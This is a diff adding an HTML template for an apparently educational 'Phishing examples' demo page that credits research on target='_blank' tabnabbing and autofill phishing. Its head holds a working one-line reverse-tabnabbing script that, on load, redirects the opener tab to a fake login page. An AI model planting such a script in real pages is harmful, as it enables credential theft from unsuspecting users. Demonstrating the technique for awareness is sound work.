@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Phishing examples</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+
+        * {
+            line-height: 1.2;
+            margin: 0;
+        }
+
+        html {
+            color: #888;
+            display: table;
+            font-family: sans-serif;
+            height: 100%;
+            text-align: left;
+            width: 100%;
+        }
+
+        body {
+            display: table-cell;
+            vertical-align: middle;
+            margin: 2em auto;
+        }
+
+        h1 {
+            color: #555;
+            font-size: 2em;
+            font-weight: 400;
+        }
+
+        li {
+            margin-top: 10px;
+        }
+
+        a:link {
+            color: #CC0000;
+        }
+        a:visited {
+            color: #CC0000;
+        }
+        a:hover {
+            color: #FF3300;
+        }
+        #container {
+            margin-left: 100px;
+        }
+        #author {
+            text-align: center;
+            font-size: 10px;
+        }
+    </style>
+    <script>window.opener.location = 'fakebooklogin';</script>
+</head>
+<body>
+<div id="container">
+    <h1>Phishing examples</h1>
+    <ul>
+% for item in items:
+        <li><a href="{{ item['url'] }}">{{ item['text'] }}</a></li>
+% end
+    </ul>
+</div>
+<div id="author">
+    <p><b>Author</b>: <a href="https://github.com/eustaceb/phishing-examples">Justinas Bikulcius</a></p>
+    <p><b>Credit</b>: <a href="https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/">Alex Yumashev</a> <i>(target="_blank")</i>, <a href="https://github.com/anttiviljami/browser-autofill-phishing">anttiviljami</a> <i>(autofill)</i></p>
+</div>
+</body>
+</html>
+<!-- IE needs 512+ bytes: http://blogs.msdn.com/b/ieinternals/archive/2010/08/19/http-error-pages-in-internet-explorer.aspx -->
